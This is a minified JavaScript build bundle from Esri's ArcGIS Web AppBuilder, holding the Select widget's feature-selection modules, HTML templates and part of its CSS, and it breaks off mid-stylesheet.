// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"jimu/dijit/FeatureSetChooserForMultipleLayers":function(){define("dojo/on dojo/sniff dojo/mouse dojo/query dojo/Evented dojo/_base/html dojo/_base/lang dojo/_base/array dojo/promise/all dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./templates/FeatureSetChooserForMultipleLayers.html dijit/popup dijit/TooltipDialog jimu/utils jimu/dijit/DrawBox jimu/dijit/_FeatureSetChooserCore jimu/dijit/FeatureActionPopupMenu".split(" "),function(h,
a,g,f,e,d,b,m,p,q,u,t,r,v,l,y,n,A,w,x){return q([u,t,r,e],{baseClass:"jimu-multiple-layers-featureset-chooser",templateString:v,drawBox:null,_instances:null,_tooltipDialogTimeoutId1:-1,_tooltipDialogClientX1:-1,_tooltipDialogTimeoutId2:-1,_tooltipDialogClientX2:-1,_tooltipTimeout:1E3,_currentGeoTypeInfo:null,_geoTypeInfos:null,map:null,updateSelection:!1,fullyWithin:!1,geoTypes:null,actions:null,postMixInProperties:function(){this.inherited(arguments);this.nls=window.jimuNls.featureSetChooser;var c=
["EXTENT","POLYGON","CIRCLE","POLYLINE"];this.geoTypes&&0<this.geoTypes.length&&(this.geoTypes=m.filter(this.geoTypes,b.hitch(this,function(a){return 0<=c.indexOf(a)})));this.geoTypes&&0!==this.geoTypes.length||(this.geoTypes=["EXTENT"])},postCreate:function(){this.inherited(arguments);this._instances=[];this.popupMenu=x.getInstance();f(".select-text",this.domNode)[0].innerHTML=this.nls.select;f(".clear-text",this.domNode)[0].innerHTML=window.jimuNls.common.clear;this._initTooltipDialogs();this._initDrawBox();
this._geoTypeInfos=[];this.actions=[];0===this.geoTypes.length&&this.geoTypes.push("EXTENT");1===this.geoTypes.length?d.addClass(this.domNode,"single-geotype"):d.addClass(this.domNode,"multiple-geotypes");var c={EXTENT:["icon-select-by-rect",this.nls.selectByRectangle,this.drawBox.extentIcon],POLYGON:["icon-select-by-polygon",this.nls.selectByPolygon,this.drawBox.polygonIcon],CIRCLE:["icon-select-by-circle",this.nls.selectByCircle,this.drawBox.circleIcon],POLYLINE:["icon-select-by-line",this.nls.selectByLine,
this.drawBox.polylineIcon]};m.forEach(["EXTENT","POLYGON","CIRCLE","POLYLINE"],b.hitch(this,function(a){var k=c[a];0<=this.geoTypes.indexOf(a)&&(a={geoType:a,action:{iconClass:k[0],label:k[1],data:{}},dom:k[2]},k={iconClass:k[0],label:k[1],data:{},onExecute:b.hitch(this,this._onDrawItemClicked,a)},this._geoTypeInfos.push(a),this.actions.push(k))}));this.own(h(this.btnSelect,"click",b.hitch(this,function(){n.simulateClickEvent(this._currentGeoTypeInfo.dom);this._hideDrawItems()})));this._setCurrentGeoInfo(this._geoTypeInfos[0]);
this.deactivate()},_initTooltipDialogs:function(){var c=a("mac")?"\u2318":"Ctrl",n="- "+this.nls.newSelectionTip+" ("+this.nls.dragMouse+")",k="- "+this.nls.addSelectionTip+" (Shift+"+this.nls.dragBox+")",z="- "+this.nls.removeSelectionTip+" ("+c+"+"+this.nls.dragBox+")",e="- "+this.nls.newSelectionTip+" ("+this.nls.drawShap+")",m="- "+this.nls.addSelectionTip+" (Shift+"+this.nls.darw+")",A="- "+this.nls.removeSelectionTip+" ("+c+"+"+this.nls.darw+")",c=d.create("div",{innerHTML:'\x3cdiv class\x3d"title"\x3e\x3c/div\x3e\x3cdiv class\x3d"item new-selection-item"\x3e\x3c/div\x3e\x3cdiv class\x3d"item add-selection-item"\x3e\x3c/div\x3e\x3cdiv class\x3d"item remove-selection-item"\x3e\x3c/div\x3e',
"class":"dialog-content"}),w=f(".title",c)[0],x=f(".new-selection-item",c)[0],p=f(".add-selection-item",c)[0],q=f(".remove-selection-item",c)[0];this.tooltipDialog1=new y({content:c});d.addClass(this.tooltipDialog1.domNode,"jimu-multiple-layers-featureset-chooser-tooltipdialog");this.own(h(this.btnSelect,"mousemove",b.hitch(this,function(c){this._tooltipDialogClientX1=c.clientX})));this.own(h(this.btnSelect,g.enter,b.hitch(this,function(){clearTimeout(this._tooltipDialogTimeoutId1);this._tooltipDialogTimeoutId1=
-1;this._tooltipDialogTimeoutId1=setTimeout(b.hitch(this,function(){if(this.tooltipDialog1){var c=this._currentGeoTypeInfo.geoType;"EXTENT"===c?(x.innerHTML=n,p.innerHTML=k,q.innerHTML=z,w.innerHTML=this.nls.selectByRectangle):(x.innerHTML=e,p.innerHTML=m,q.innerHTML=A,"POLYGON"===c?w.innerHTML=this.nls.selectByPolygon:"CIRCLE"===c?w.innerHTML=this.nls.selectByCircle:"POLYLINE"===c&&(w.innerHTML=this.nls.selectByLine));l.open({parent:this.getParent(),popup:this.tooltipDialog1,around:this.btnSelect,
position:["below"]});0<=this._tooltipDialogClientX1&&(this.tooltipDialog1.domNode.parentNode.style.left=this._tooltipDialogClientX1+"px")}}),this._tooltipTimeout)})));this.own(h(this.btnSelect,g.leave,b.hitch(this,function(){clearTimeout(this._tooltipDialogTimeoutId1);this._tooltipDialogTimeoutId1=-1;this._hideTooltipDialog(this.tooltipDialog1)})));c=d.create("div",{innerHTML:this.nls.unselectAllSelectionTip,"class":"dialog-content"});this.tooltipDialog2=new y({content:c});d.addClass(this.tooltipDialog2.domNode,
"jimu-multiple-layers-featureset-chooser-tooltipdialog");this.own(h(this.btnClear,"mousemove",b.hitch(this,function(c){this._tooltipDialogClientX2=c.clientX})));this.own(h(this.btnClear,g.enter,b.hitch(this,function(){clearTimeout(this._tooltipDialogTimeoutId2);this._tooltipDialogTimeoutId2=-1;this._tooltipDialogTimeoutId2=setTimeout(b.hitch(this,function(){this.tooltipDialog2&&(l.open({parent:this.getParent(),popup:this.tooltipDialog2,around:this.btnClear,position:["below"]}),0<=this._tooltipDialogClientX2&&
(this.tooltipDialog2.domNode.parentNode.style.left=this._tooltipDialogClientX2+"px"))}),this._tooltipTimeout)})));this.own(h(this.btnClear,g.leave,b.hitch(this,function(){clearTimeout(this._tooltipDialogTimeoutId2);this._tooltipDialogTimeoutId2=-1;this._hideTooltipDialog(this.tooltipDialog2)})))},_onArrowClicked:function(c){c.stopPropagation();c=d.position(c.target);this._showDrawItems(c)},_setCurrentGeoInfo:function(c){var a=this._currentGeoTypeInfo&&this._currentGeoTypeInfo.geoType;this._currentGeoTypeInfo&&
d.removeClass(this.currentDrawItem,this._currentGeoTypeInfo.geoType);this._currentGeoTypeInfo=c;d.addClass(this.currentDrawItem,this._currentGeoTypeInfo.geoType);this.isActive()?a!==this._currentGeoTypeInfo.geoType&&n.simulateClickEvent(this._currentGeoTypeInfo.dom):n.simulateClickEvent(this._currentGeoTypeInfo.dom)},_showDrawItems:function(c){this.popupMenu.setActions(this.actions);this.popupMenu.show(c)},_hideDrawItems:function(){this.popupMenu.hide()},_onDrawItemClicked:function(c){this._hideDrawItems();
this._setCurrentGeoInfo(c);d.removeClass(this.geoTypeIcon,["icon-select-by-circle","icon-select-by-rect","icon-select-by-polygon","icon-select-by-line"]);switch(c.geoType){case "POLYGON":d.addClass(this.geoTypeIcon,"icon-select-by-polygon");break;case "CIRCLE":d.addClass(this.geoTypeIcon,"icon-select-by-circle");break;case "POLYLINE":d.addClass(this.geoTypeIcon,"icon-select-by-line");break;default:d.addClass(this.geoTypeIcon,"icon-select-by-rect")}},_initDrawBox:function(){this.drawBox=new A({map:this.map,
showClear:!0,keepOneGraphic:!0,deactivateAfterDrawing:!1,geoTypes:this.geoTypes});this.own(h(this.drawBox,"user-clear",b.hitch(this,this._onDrawBoxUserClear)));this.own(h(this.drawBox,"draw-end",b.hitch(this,this._onDrawEnd)));this.own(h(this.drawBox,"draw-activate",b.hitch(this,function(){this.map.infoWindow.hide();d.addClass(this.currentDrawItem,"pressed");d.addClass(this.btnSelect,"selected");this.popupMenu.markAsSelected(this._currentGeoTypeInfo.action)})));this.own(h(this.drawBox,"draw-deactivate",
b.hitch(this,function(){d.removeClass(this.currentDrawItem,"pressed");d.removeClass(this.btnSelect,"selected")})));this.own(h(this.btnClear,"click",b.hitch(this,function(){n.simulateClickEvent(this.drawBox.btnClear)})))},disable:function(){this.drawBox.disable();d.addClass(this.domNode,"disabled")},enable:function(){this.drawBox.enable();d.removeClass(this.domNode,"disabled")},isActive:function(){return this.drawBox.isActive()},activate:function(){if(!this.isActive()){var c=this._currentGeoTypeInfo;
c||(c=this._geoTypeInfos[0]);this._setCurrentGeoInfo(c)}},deactivate:function(){this.drawBox.deactivate()},setFeatureLayers:function(c){var a=m.filter(this._instances,b.hitch(this,function(a){return 0>c.indexOf(a.featureLayer)}));m.forEach(a,b.hitch(this,function(c){this._removeInstance(c)}));var k=m.map(this._instances,b.hitch(this,function(c){return c.featureLayer}));m.forEach(c,b.hitch(this,function(c){0>k.indexOf(c)&&this.addFeatureLayer(c)}))},addFeatureLayer:function(c){"esri.layers.FeatureLayer"!==
c.declaredClass||this._findInstanceByLayer(c)||(c=new w({map:this.map,featureLayer:c,drawBox:this.drawBox,updateSelection:this.updateSelection,fullyWithin:this.fullyWithin}),this._instances.push(c))},removeFeatureLayer:function(c){"esri.layers.FeatureLayer"===c.declaredClass&&(c=this._findInstanceByLayer(c))&&this._removeInstance(c)},_removeInstance:function(c){if(c){var a=this._instances.indexOf(c);0<=a&&(c.destroy(),this._instances.splice(a,1))}},_findInstanceByLayer:function(c){var a=null;m.some(this._instances,
b.hitch(this,function(k){return k.featureLayer===c?(a=k,!0):!1}));return a},clear:function(c){m.forEach(this._instances,b.hitch(this,function(a){a.clear(c)}))},destroy:function(){this._hideTooltipDialog(this.tooltipDialog1);this._hideTooltipDialog(this.tooltipDialog2);m.forEach(this._instances,b.hitch(this,function(c){c.destroy()}));this._instances=[];this.drawBox&&this.drawBox.destroy();this.drawBox=null;this.inherited(arguments)},_hideTooltipDialog:function(c){c&&l.close(c)},_onDrawBoxUserClear:function(){this.clear(!0);
this.emit("user-clear")},_onDrawEnd:function(){this.drawBox.clear();0<this._instances.length&&setTimeout(b.hitch(this,function(){if(0<this._instances.length){this.emit("loading");this.disable();var c=m.map(this._instances,b.hitch(this,function(c){return c.getFeatures()}));p(c).always(b.hitch(this,function(){this.enable();this._currentGeoTypeInfo&&n.simulateClickEvent(this._currentGeoTypeInfo.dom);this.emit("unloading")}))}}),50)}})})},"jimu/dijit/_FeatureSetChooserCore":function(){define("dojo/on dojo/sniff dojo/Evented dojo/Deferred dojo/_base/lang dojo/_base/array dojo/_base/declare jimu/utils jimu/symbolUtils jimu/SelectionManager jimu/LayerInfos/LayerInfos esri/graphic esri/tasks/query esri/tasks/QueryTask esri/layers/FeatureLayer esri/symbols/jsonUtils".split(" "),
function(h,a,g,f,e,d,b,m,p,q,u,t,r,v,l,y){return b([g],{baseClass:"jimu-featureset-chooser-core",_middleFeatureLayer:null,_isLoading:!1,_def:null,_isDestroyed:!1,_handles:null,selectionManager:null,layerInfosObj:null,map:null,featureLayer:null,drawBox:null,updateSelection:!1,fullyWithin:!1,constructor:function(a){e.mixin(this,a);this.layerInfosObj=u.getInstanceSync();this.selectionManager=q.getInstance();this.featureLayer.getSelectionSymbol()||this.selectionManager.setSelectionSymbol(this.featureLayer);
a=m.getFeatureLayerDefinition(this.featureLayer);delete a.id;this._middleFeatureLayer=new l({layerDefinition:a,featureSet:null},{id:"featureLayer_"+m.getRandomString()});a=null;var n=this._middleFeatureLayer.geometryType;"esriGeometryPoint"===n?a=p.getDefaultMarkerSymbol():"esriGeometryPolyline"===n?a=p.getDefaultLineSymbol():"esriGeometryPolygon"===n&&(a=y.fromJson({style:"esriSFSSolid",color:[79,129,189,77],type:"esriSFS",outline:{style:"esriSLSSolid",color:[54,93,141,255],width:1.5,type:"esriSLS"}}));
this._middleFeatureLayer.setSelectionSymbol(a);a=h(this.drawBox,"user-clear",e.hitch(this,this._onDrawBoxUserClear));n=h(this.drawBox,"draw-end",e.hitch(this,this._onDrawEnd));this._handles=[a,n]},hideMiddleFeatureLayer:function(){if(this._middleFeatureLayer){this._middleFeatureLayer.hide();var a=this.selectionManager.getDisplayLayer(this._middleFeatureLayer.id);a&&a.hide()}},showMiddleFeatureLayer:function(){if(this._middleFeatureLayer){this._middleFeatureLayer.show();var a=this.selectionManager.getDisplayLayer(this._middleFeatureLayer.id);
a&&a.show()}},clear:function(a){this.drawBox.clear();this._clearMiddleFeatureLayer();a&&this.selectionManager.clearSelection(this.featureLayer)},getFeatures:function(){var a=new f,b=e.hitch(this,function(){var b=this.syncGetFeatures();a.resolve(b)}),l=e.hitch(this,function(b){a.reject(b)});1===this._getDeferredStatus(this._def)?this._def.then(b,l):b();return a},syncGetFeatures:function(){return(this.updateSelection?this.featureLayer:this._middleFeatureLayer).getSelectedFeatures()},isLoading:function(){return 1===
this._getDeferredStatus(this._def)},_onLoading:function(){this.drawBox.deactivate();this.emit("loading")},_onUnloading:function(){this.emit("unloading")},_getDeferredStatus:function(a){var b=0;return b=a?a.isResolved()?2:a.isRejected()?-1:1:0},_onDrawEnd:function(b,d,g,h,c,m){console.log(d,g);if(this.isLoading())throw"should not draw when loading";if(this.featureLayer.visible){var k=new f;this._def=k;var z=l.SELECTION_NEW;h&&(z=l.SELECTION_ADD);a("mac")?m&&(z=l.SELECTION_SUBTRACT):c&&(z=l.SELECTION_SUBTRACT);
this._onLoading();this._getFeaturesByGeometry(b.geometry).then(e.hitch(this,function(a){this.selectionManager.updateSelectionByFeatures(this.updateSelection?this.featureLayer:this._middleFeatureLayer,a,z);this._onUnloading();k.resolve(a)}),e.hitch(this,function(a){console.error(a);this._onUnloading();k.reject(a)}))}},_getFeaturesByGeometry:function(a){var b=new f,l=[];if(this.featureLayer.getMap())a=this.selectionManager.getClientFeaturesByGeometry(this.featureLayer,a,this.fullyWithin),0<a.length&&
(l=d.map(a,e.hitch(this,function(a){return new t(a.toJson())}))),b.resolve(l);else{l=new r;l.geometry=a;l.outSpatialReference=this.map.spatialReference;l.returnGeometry=!0;l.spatialRelationship=this.fullyWithin?r.SPATIAL_REL_CONTAINS:r.SPATIAL_REL_INTERSECTS;(a=this.featureLayer.getDefinitionExpression())||(a="1\x3d1");var g=this.layerInfosObj.getLayerInfoById(this.featureLayer.id);g&&(g=g.getFilter())&&(a="("+a+") AND ("+g+")");a&&(l.where=a);l.outFields=["*"];(new v(this.featureLayer.url)).execute(l).then(e.hitch(this,
function(a){b.resolve(a.features)}),e.hitch(this,function(a){b.reject(a)}))}return b},_onDrawBoxUserClear:function(){this.clear()},_clearMiddleFeatureLayer:function(){this._middleFeatureLayer&&(this._middleFeatureLayer.clear(),this.selectionManager.clearSelection(this._middleFeatureLayer))},destroy:function(){this._isDestroyed||(d.forEach(this._handles,e.hitch(this,function(a){a.remove()})),this._handles=null,this.clear());this._isDestroyed=!0}})})},"widgets/Select/layerUtil":function(){define(["dojo/_base/array",
"dojo/promise/all","dojo/Deferred"],function(h,a,g){return{getLayerInfoArray:function(f){var e=new g,d=[];f.traversal(function(a){d.push(a)});f=h.map(d,function(a){return a.getLayerType()});a(f).then(function(a){var b=[];h.forEach(a,function(a,f){"FeatureLayer"===a&&b.push(d[f])});e.resolve(b)});return e}}})},"widgets/Select/SelectableLayerItem":function(){define("dojo/_base/declare dojo/_base/html dojo/_base/lang dojo/_base/event dojo/on dojo/Evented dojo/dom-geometry jimu/utils jimu/dijit/FeatureActionPopupMenu dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./SelectableLayerItem.html ./ClearSelectionAction".split(" "),
function(h,a,g,f,e,d,b,m,p,q,u,t,r,v){return h([q,u,t,d],{baseClass:"selectable-layer-item",templateString:r,layerName:"layer",layerVisible:!0,checked:!1,allowExport:!1,inited:!1,postCreate:function(){this.inherited(arguments);this.popupMenu=p.getInstance()},init:function(b){this.featureLayer=b;b=this.featureLayer.getSelectedFeatures().length;this.layerName=this.layerInfo.title||"layer";this.selectedCountNode.innerHTML=b;0<b?a.removeClass(this.domNode,"no-action"):a.addClass(this.domNode,"no-action");
this.own(e(this.featureLayer,"selection-complete",g.hitch(this,function(){var b=this.featureLayer.getSelectedFeatures().length;this.selectedCountNode.innerHTML=b;0===b?a.addClass(this.domNode,"no-action"):a.removeClass(this.domNode,"no-action")})));this.own(e(this.featureLayer,"selection-clear",g.hitch(this,function(){this.selectedCountNode.innerHTML=0;a.addClass(this.domNode,"no-action")})));this.layerNameNode.innerHTML=this.layerName;this.layerNameNode.title=this.layerName;this.layerVisible||a.addClass(this.domNode,
"invisible");this.checked?a.addClass(this.selectableCheckBox,"checked"):a.removeClass(this.selectableCheckBox,"checked");this.own(e(this.selectableCheckBox,"click",g.hitch(this,this._toggleChecked)));this.own(e(this.layerContent,"click",g.hitch(this,this._toggleContent)));this.own(e(this.actionBtn,"click",g.hitch(this,this._showActions)));this.inited=!0;this.emit("inited")},isLayerVisible:function(){return this.layerVisible},isChecked:function(){return this.checked},updateLayerVisibility:function(){var b=
this.layerInfo.isShowInMap()&&this.layerInfo.isInScale();b!==this.layerVisible&&((this.layerVisible=b)?a.removeClass(this.domNode,"invisible"):a.addClass(this.domNode,"invisible"),this.emit("stateChange",{visible:this.layerVisible,layerInfo:this.layerInfo}))},turnOn:function(){a.addClass(this.selectableCheckBox,"checked");this.checked=!0},turnOff:function(){a.removeClass(this.selectableCheckBox,"checked");this.checked=!1},toggleChecked:function(){(this.checked=!this.checked)?a.addClass(this.selectableCheckBox,
"checked"):a.removeClass(this.selectableCheckBox,"checked")},_toggleChecked:function(b){f.stop(b);a.toggleClass(this.selectableCheckBox,"checked");this.checked=a.hasClass(this.selectableCheckBox,"checked");this.emit("stateChange",{checked:this.checked,layerInfo:this.layerInfo})},_toggleContent:function(b){f.stop(b);a.hasClass(this.domNode,"no-action")||this.emit("switchToDetails",this)},_showActions:function(l){f.stop(l);if(!a.hasClass(this.domNode,"no-action")){var e=this.featureLayer.getSelectedFeatures(),
d=m.toFeatureSet(e);this.popupMenu.prepareActions(d,this.allowExport).then(g.hitch(this,function(){var a=b.position(l.target);0<e.length&&this.popupMenu.appendAction(new v({folderUrl:this.folderUrl,data:this.featureLayer}));this.popupMenu.show(a,this.nls.actionsTitle)}))}}})})},"widgets/Select/ClearSelectionAction":function(){define(["dojo/_base/declare","jimu/BaseFeatureAction","jimu/SelectionManager"],function(h,a,g){return h(a,{name:"ClearSelection",iconClass:"icon-clear-selection",constructor:function(){this.label=
window.jimuNls.featureActions.ClearSelection},isFeatureSupported:function(a){return 0<a.features.length&&a.geometryType},onExecute:function(a){g.getInstance().clearSelection(a)},getIcon:function(a){return this.folderUrl+"images/"+this.name+"_"+a+"."+this.iconFormat}})})},"widgets/Select/FeatureItem":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/html dojo/_base/event dojo/on dojo/dom-geometry dijit/_WidgetBase dijit/_TemplatedMixin dojo/text!./FeatureItem.html jimu/utils jimu/symbolUtils jimu/dijit/FeatureActionPopupMenu jimu/featureActions/PanTo jimu/featureActions/ShowPopup".split(" "),
function(h,a,g,f,e,d,b,m,p,q,u,t,r,v){return h([b,m],{baseClass:"graphic-item",templateString:p,allowExport:!1,postCreate:function(){this.inherited(arguments);var b;this.featureLayer&&this.featureLayer.renderer&&this.featureLayer.renderer.getSymbol?b=this.featureLayer.renderer.getSymbol(this.graphic):this.graphic.symbol&&(b=this.graphic.symbol);b&&(b=u.createSymbolNode(b,{width:36,height:36}),g.place(b,this.iconNode));this.popupMenu=t.getInstance();this.nameNode.innerHTML=this.graphic.attributes[this.displayField]||
this.graphic.attributes[this.objectIdField];this.nameNode.title=this.graphic.attributes[this.displayField]||this.graphic.attributes[this.objectIdField];this.own(e(this.actionBtn,"click",a.hitch(this,this._showActions)));this.own(e(this.iconNode,"click",a.hitch(this,this._highlight)));this.own(e(this.nameNode,"click",a.hitch(this,this._highlight)))},_highlight:function(){var a=q.toFeatureSet([this.graphic]),b=new r({map:this.map});(new v({map:this.map})).onExecute(a);b.onExecute(a)},_showActions:function(b){f.stop(b);
var e=q.toFeatureSet([this.graphic]);this.popupMenu.prepareActions(e,this.allowExport).then(a.hitch(this,function(){var a=d.position(b.target);this.popupMenu.show(a)}))}})})},"widgets/Select/_build-generate_module":function(){define(["dojo/text!./Widget.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:jimu/dijit/templates/FeatureSetChooserForMultipleLayers.html":'\x3cdiv class\x3d"jimu-not-selectable"\x3e\r\n  \x3cdiv class\x3d"draw-item-btn"\x3e\r\n    \x3cdiv class\x3d"current-draw-item" data-dojo-attach-point\x3d"currentDrawItem"\x3e\r\n      \x3cdiv class\x3d"btn-select" data-dojo-attach-point\x3d"btnSelect"\x3e\r\n        \x3cdiv class\x3d"labels"\x3e\r\n            \x3cdiv class\x3d"feature-action icon-select-by-rect" data-dojo-attach-point\x3d"geoTypeIcon"\x3e\x3c/div\x3e\r\n            \x3cdiv class\x3d"select-text"\x3e\x3c/div\x3e\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"arrow feature-action icon-drop-down" data-dojo-attach-event\x3d"click:_onArrowClicked"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"btn-clear" data-dojo-attach-point\x3d"btnClear"\x3e\r\n    \x3cdiv class\x3d"feature-action icon-clear-selection"\x3e\x3c/div\x3e\x3cdiv class\x3d"clear-text"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e',
"url:widgets/Select/SelectableLayerItem.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"layer-row" data-dojo-attach-point\x3d"layerContent"\x3e\r\n    \x3cdiv class\x3d"selectable-check" title\x3d"${nls.toggleSelectability}"\r\n         data-dojo-attach-point\x3d"selectableCheckBox"\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"layer-name jimu-ellipsis" data-dojo-attach-point\x3d"layerNameNode"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"selected-num" data-dojo-attach-point\x3d"selectedCountNode"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"feature-action icon-more" title\x3d"${nls.showActions}"\r\n    data-dojo-attach-point\x3d"actionBtn"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e',
"url:widgets/Select/FeatureItem.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"feature-item-row"\x3e\r\n    \x3cdiv class\x3d"feature-icon" data-dojo-attach-point\x3d"iconNode"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"light-label label-node jimu-ellipsis" data-dojo-attach-point\x3d"nameNode"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"action-btn feature-action icon-more" title\x3d"${nls.showActions}"\r\n     data-dojo-attach-point\x3d"actionBtn"\x3e\x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e',"url:widgets/Select/Widget.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"layer-node" data-dojo-attach-point\x3d"layerListNode"\x3e\r\n    \x3cdiv\x3e\r\n      \x3cdiv class\x3d"select-dijit-container" data-dojo-attach-point\x3d"selectDijitNode"\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"seperator"\x3e\x3c/div\x3e\r\n      \x3cdiv class\x3d"tool-section"\x3e\r\n        \x3cdiv class\x3d"jimu-float-leading label"\x3e${nls.layer}\x3c/div\x3e\r\n        \x3cdiv class\x3d"jimu-float-trailing setting feature-action icon-operation" data-dojo-attach-point\x3d"settingNode"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"layer-nodes" \x3e\r\n      \x3cdiv class\x3d"layer-items" data-dojo-attach-point\x3d"layerItemsNode"\x3e\x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"details-node" data-dojo-attach-point\x3d"detailsNode"\x3e\r\n    \x3cdiv class\x3d"header"\x3e\r\n      \x3cdiv class\x3d"switch-back jimu-float-leading" data-dojo-attach-point\x3d"switchBackBtn"\x3e\r\n        \x3cdiv class\x3d"feature-action" data-dojo-attach-point\x3d"switchBackIcon"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"layer-name jimu-ellipsis" data-dojo-attach-point\x3d"selectedLayerName"\x3e\x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"content" data-dojo-attach-point\x3d"featureContent"\x3e\r\n\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv data-dojo-attach-point\x3d"shelter" data-dojo-type\x3d"jimu/dijit/LoadingShelter" data-dojo-props\x3d\'hidden:true\'\x3e\x3c/div\x3e\r\n\x3c/div\x3e',
"url:widgets/Select/css/style.css":'.jimu-widget-select {width: 100%; height: 100%; min-width: 280px; overflow: hidden;}.jimu-widget-select .jimu-viewstack {height: 100%;}.jimu-widget-select .jimu-viewstack .view {position: relative;}.jimu-widget-select .tool-section {height: 36px; position: relative;}.jimu-widget-select .tool-section .label {font-size: 14px; line-height: 36px; margin: 0 10px;}.jimu-widget-select .tool-section .setting {width: 16px; height: 16px; margin: 10px; cursor: pointer;}.jimu-widget-select .selectable-check {width: 36px; height: 36px; cursor: pointer; background: url(images/unchecked.svg) no-repeat center;}.jimu-widget-select .selectable-check:hover {background: url(images/unchecked_hover.svg) no-repeat center;}.jimu-widget-select .selectable-check.checked {background: url(images/checked.svg) no-repeat center;}.jimu-widget-select .selectable-check.checked:hover {background: url(images/checked_hover.svg) no-repeat center;}.jimu-widget-select .seperator {width: 100%; height: 1px; background: #D7D7D7; margin-top: 20px;}.jimu-widget-select .title {font-family: "Avenir Light"; font-size: 12px; line-height: 16px; color: #000000; margin: 20px 0;}.jimu-widget-select .normal-label, .jimu-widget-select .light-label, .jimu-widget-select .selectable-layer-item .layer-row .layer-name, .jimu-widget-select .selectable-layer-item .layer-row .selected-num, .jimu-widget-select .medium-label {line-height: 36px; height: 36px; font-size: 12px; color: #000000;}.jimu-widget-select .light-label, .jimu-widget-select .selectable-layer-item .layer-row .layer-name, .jimu-widget-select .selectable-layer-item .layer-row .selected-num {font-family: "Avenir Light";}.jimu-widget-select .medium-label {font-family: "Avenir Medium";}.jimu-widget-select .layer-nodes {position: absolute; top: 100px; bottom: 0; width: 100%; overflow: auto;}.jimu-widget-select .jimu-multiple-layers-featureset-chooser .draw-item {padding: 0;}.jimu-widget-select .jimu-multiple-layers-featureset-chooser .btn-clear {padding: 0; width: 30%;}.jimu-rtl .jimu-widget-select .jimu-multiple-layers-featureset-chooser .btn-clear {float: left;}.jimu-widget-select .selectable-layer-item {width: 100%; height: 36px; position: relative;}.jimu-widget-select .selectable-layer-item .layer-row {height: 36px; position: relative; cursor: pointer;}.jimu-widget-select .selectable-layer-item .layer-row \x3e div {display: inline-block;}.jimu-widget-select .selectable-layer-item .layer-row .layer-name {margin: 0 5px; position: absolute; left: 36px; right: 72px;}.jimu-rtl .jimu-widget-select .selectable-layer-item .layer-row .layer-name {left: 72px; right: 36px;}.jimu-widget-select .selectable-layer-item .layer-row .selected-num {width: 36px; margin: 0 5px; text-align: center; position: absolute; right: 36px;}.jimu-rtl .jimu-widget-select .selectable-layer-item .layer-row .selected-num {right: auto; left: 36px;}.jimu-widget-select .selectable-layer-item .layer-row .feature-action {position: absolute; right: 0; width: 36px; height: 36px; padding: 10px;}.jimu-rtl .jimu-widget-select .selectable-layer-item .layer-row .feature-action {right: auto; left: 0;}.jimu-widget-select .selectable-layer-item:hover {background-color: #E5E5E5;}.jimu-widget-select .selectable-layer-item:hover .selected-num {font-weight: bold;}.jimu-widget-select .selectable-layer-item.no-action .selected-num {font-weight: normal;}.jimu-widget-select .selectable-layer-item.no-action:hover {background-color: #FFFFFF;}.jimu-widget-select .selectable-layer-item.no-action .layer-row {cursor: default;}.jimu-widget-select .selectable-layer-item.no-action .layer-row .feature-action {cursor: default;}.jimu-widget-select .selectable-layer-item.no-action .layer-row .feature-action:hover {color: rgba(0, 0, 0, 0.5);}.jimu-widget-select .selectable-layer-item.no-action .selected-num {color: #B7B7B7;}.jimu-widget-select .selectable-layer-item.no-action .selected-num:hover {font-weight: normal;}.jimu-widget-select .selectable-layer-item.invisible .selectable-check {background: url(images/unchecked_invisible.svg) no-repeat center;}.jimu-widget-select .selectable-layer-item.invisible .selectable-check:hover {background: url(images/unchecked_invisible_hover.svg) no-repeat center;}.jimu-widget-select .selectable-layer-item.invisible .selectable-check.checked {background: url(images/checked_invisible.svg) no-repeat center;}.jimu-widget-select .selectable-layer-item.invisible .selectable-check.checked:hover {background: url(images/checked_invisible_hover.svg) no-repeat center;}.jimu-widget-select .selectable-layer-item.invisible .layer-name {color: #B7B7B7;}.jimu-widget-select .details-node {widows: 100%;}.jimu-widget-select .details-node .header {height: 40px; text-align: center;}.jimu-widget-select .details-node .header .switch-back {width: 40px; height: 40px;}.jimu-widget-select .details-node .header .switch-back .feature-action {margin: 12px;}.jimu-widget-select .details-node .header .layer-name {font-family: "Avenir Medium"; font-size: 14px; font-size: 14px; color: #000000; height: 40px; line-height: 40px;}.jimu-widget-select .details-node .content {position: absolute; top: 40px; bottom: 0; width: 100%; overflow: auto;}.jimu-widget-select .details-node .content .graphic-item {height: 36px; width: 100%; position: relative;}.jimu-widget-select .details-node .content .graphic-item:hover {background: #E5E5E5;}.jimu-widget-select .details-node .content .graphic-item .feature-item-row {position: relative; height: 36px; cursor: 